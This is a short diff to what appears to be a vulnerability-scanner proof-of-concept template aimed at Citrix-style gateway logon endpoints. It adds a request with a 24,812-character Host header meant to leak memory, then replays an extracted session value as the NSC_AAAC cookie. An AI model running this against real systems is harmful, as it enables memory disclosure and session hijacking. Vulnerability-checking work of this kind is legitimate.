@@ -13,6 +13,7 @@ logic = "all"
 [[poc.requests]]
 method = "GET"
 path = "/oauth/idp/.well-known/openid-configuration"
+headers = { Host = "{{repeat(\"a\", 24812)}}" }
 
 [[poc.requests.extractors]]
 type = "regex"
@@ -30,7 +31,7 @@ expect = true
 [[poc.requests]]
 method = "POST"
 path = "/logon/LogonPoint/Authentication/GetUserName"
-headers.Cookie = "NSC_AAAC={{session}}"
+headers = { Cookie = "NSC_AAAC={{session}}" }
 
 [[poc.requests.matchers]]
 type = "word"
